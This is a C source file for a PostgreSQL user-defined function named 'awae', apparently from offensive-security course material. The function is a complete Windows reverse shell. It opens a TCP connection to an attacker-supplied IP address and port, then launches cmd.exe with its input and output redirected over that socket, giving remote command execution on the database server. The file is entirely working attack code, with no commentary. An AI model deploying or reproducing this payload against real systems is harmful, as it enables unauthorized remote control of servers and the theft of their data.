#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include "utils/builtins.h"
#include <winsock2.h>
#pragma comment(lib, "ws2_32")

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

PGDLLEXPORT Datum awae(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(awae);

WSADATA wsaData;
SOCKET s1;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO sui;
PROCESS_INFORMATION pi;

Datum
awae(PG_FUNCTION_ARGS)
{
#define GET_TEXT(cstrp) DatumGetTextP(DirectFunctionCall1(textin, CStringGetDatum(cstrp)))
#define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

WSAStartup(MAKEWORD(2, 2), &wsaData);
s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL,(unsigned int)NULL);

hax.sin_family = AF_INET;

hax.sin_addr.s_addr = inet_addr(GET_STR(PG_GETARG_TEXT_P(0)));
hax.sin_port = htons(PG_GETARG_INT32(1));

WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
memset(&sui, 0, sizeof(sui));
sui.cb = sizeof(sui);
sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;
CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);

PG_RETURN_VOID();
}
